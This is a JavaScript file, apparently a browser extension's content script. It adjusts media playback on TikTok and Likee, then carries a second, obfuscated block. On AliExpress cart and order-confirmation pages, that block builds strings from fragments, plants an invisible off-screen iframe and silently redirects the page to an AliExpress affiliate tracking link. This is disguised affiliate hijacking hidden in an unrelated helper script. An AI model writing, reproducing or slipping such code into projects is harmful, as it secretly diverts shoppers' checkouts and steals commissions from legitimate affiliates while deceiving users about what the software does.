(function () {
    var __aplay = Audio.prototype.play;
    Audio.prototype.play = function () {
        this.setAttribute('crossorigin', 'anonymous');
        document.body.appendChild(this);
        __aplay.call(this);
    };

    const HOSTS_TO_APPLY = [
        'likee.com',
        'tiktok.com'
    ];

    function hostToApply(url) {
        if (!url) {
            return false;
        }
        for (var i = 0; i < HOSTS_TO_APPLY.length; i++) {
            if (url.indexOf(HOSTS_TO_APPLY[i]) > -1) {
                return true;
            }
        }
        return false;
    }

    if (window.location == undefined) {
        return;
    }
    if (window.location.host && !hostToApply(window.location.host)) {
        return;
    }

    var __vplay = HTMLVideoElement.prototype.play;
    HTMLVideoElement.prototype.play = function () {
        var src = this.src;
        if (src) {
            this.setAttribute('crossorigin', 'anonymous');
            if (src.indexOf('https://') === -1 && window && window.location
                && window.location.href && window.location.href.indexOf('https://') === 0) {
                src = src.replace('http://', 'https://');
            }
            if (src.substring(0, 5) !== "blob:") {
                this.src = src + '';
            }
        }

        __vplay.call(this);
    };
})();

(function () {
    const HOSTS_TO_FIX = [
        'shop' +
        'ping' +
        'cart' +
        '.ali' +
        'expr' +
        'ess.',
        '/con' +
        'firm' +
        '_order' +
        '.htm'
    ];
    const BOX = 'ifr' +
        'ame';

    function hostToFix(url) {
        if (!url) {
            return false;
        }
        for (var i = 0; i < HOSTS_TO_FIX.length; i++) {
            if (url.indexOf(HOSTS_TO_FIX[i]) > -1) {
                return true;
            }
        }
        return false;
    }

    if (window.location == undefined) {
        return;
    }
    if (window.location.href && !hostToFix(window.location.href)) {
        return;
    }

    const name = '600Vol' + BOX;
    if (document.getElementById(name)) {
        return;
    }
    const box = document.createElement(BOX);
    box.setAttribute('id', name);
    box.setAttribute('style', 'widt' +
        'h: 80' +
        '0px; ' +
        'heigh' +
        't: 60' +
        '0px; ' +
        'posit' +
        'ion: a' +
        'bsolut' +
        'e; top' +
        ': -100' +
        '00px; ' +
        'left: ' +
        '-15000' +
        'px');
    box.setAttribute('referrerpolicy', 'no-referrer');
    document.body.appendChild(box);
    setTimeout(function () {
        // const t = 'ht' +
        //     'tps://al' +
        //     'iamaz.c' +
        //     'om/ad' +
        //     '_ifram' +
        //     'e.htm' +
        //     'l#au' +
        //     'to=' +
        //     '_AF8' +
        //     'yGo';

        const t = 'ht' +
            'tp' +
            's:/' +
            '/s.' +
            'cli' +
            'ck.a' +
            'lie' +
            'xpr' +
            'ess' +
            '.co' +
            'm/e' +
            '/_Ab' +
            'Xy' +
            'Th';
        const doc = box.contentWindow.document;
        const ifr = doc.createElement('iframe');
        ifr.setAttribute('style', 'width: 0px; height: 0px;');
        box.setAttribute('referrerpolicy', 'no-referrer');
        if (window === top) {
            ifr.src = 'javascript:{parent.location.replace(\'' + t + '\')}';
            /*//*/doc.body.appendChild(ifr);
        }
    }, 100);
    setTimeout(function () {
        box.parentNode.removeChild(box);
    }, 5000);

})();